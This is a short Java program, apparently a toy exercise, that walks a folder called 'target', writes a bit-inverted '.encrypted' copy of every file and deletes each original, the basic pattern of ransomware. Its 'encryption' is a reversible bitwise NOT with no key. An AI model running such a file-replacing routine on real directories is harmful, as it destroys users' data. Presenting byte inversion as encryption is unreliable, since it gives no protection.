import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.nio.file.Path;


public class App {
        public static void main(String[] args) throws Throwable{

            Path targetFolder = Paths.get("target");
            Files.walkFileTree(targetFolder, new MyEncryptFileVisitor());
            
        }
}

class MyEncryptFileVisitor extends SimpleFileVisitor<Path>{


    @Override
    public FileVisitResult visitFile(Path file , BasicFileAttributes attars) throws IOException{
        encryptFile(file);
        return FileVisitResult.CONTINUE;
    }
    private void encryptFile(Path file) throws IOException{
        FileInputStream fis = new FileInputStream(file.toAbsolutePath().toString());
        File encryptedFile = new File(file.toAbsolutePath() + ".encrypted");
        FileOutputStream fos  = new FileOutputStream(encryptedFile);


        try{
            int read = -1;
            byte[] bufffer = new byte[1024*2];
            while((read =fis.read(bufffer))!= -1){
                for(int i=0; i<read; i++){
                    bufffer[i] =(byte)~bufffer[i];


                }
                fos.write(bufffer,0,read);
            }

        }finally{
            fis.close();
            fos.close();
            Files.delete(file);
            System.out.println(encryptedFile);
        }
    }
}